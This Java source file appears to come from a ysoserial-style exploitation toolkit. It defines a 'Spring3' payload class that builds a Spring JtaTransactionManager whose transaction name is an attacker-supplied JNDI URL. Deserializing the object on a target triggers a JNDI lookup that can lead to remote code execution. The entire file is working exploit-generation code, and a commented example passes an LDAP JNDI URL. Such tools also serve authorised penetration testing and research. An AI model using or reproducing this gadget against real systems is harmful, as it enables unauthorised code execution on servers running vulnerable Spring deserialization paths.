package me.gv7.woodpecker.yso.payloads;

import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
import me.gv7.woodpecker.yso.payloads.custom.CustomCommand;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import org.springframework.transaction.jta.JtaTransactionManager;


/**
 * Spring-tx JtxTransactionManager JNDI Injection
 *
 * @author wh1t3P1g
 * @since 2020/2/5
 */
@Dependencies({"org.springframework:spring-tx:5.2.3.RELEASE","org.springframework:spring-context:5.2.3.RELEASE","javax.transaction:javax.transaction-api:1.2"})
@Authors({ Authors.WH1T3P1G })
public class Spring3 extends PayloadRunner implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        String jndiURL = null;
        if(command.toLowerCase().startsWith(CustomCommand.COMMAND_JNDI)){
            jndiURL = command.substring(CustomCommand.COMMAND_JNDI.length());
        }else{
            throw new Exception(String.format("Command [%s] not supported",command));
        }

        JtaTransactionManager manager = new JtaTransactionManager();
        manager.setUserTransactionName(jndiURL);
        return manager;
    }

    public static void main(String[] args) throws Exception {
        //args = new String[]{"jndi:ldap://127.0.0.1:1664/obj"};
        PayloadRunner.run(Spring3.class, args);
    }
}
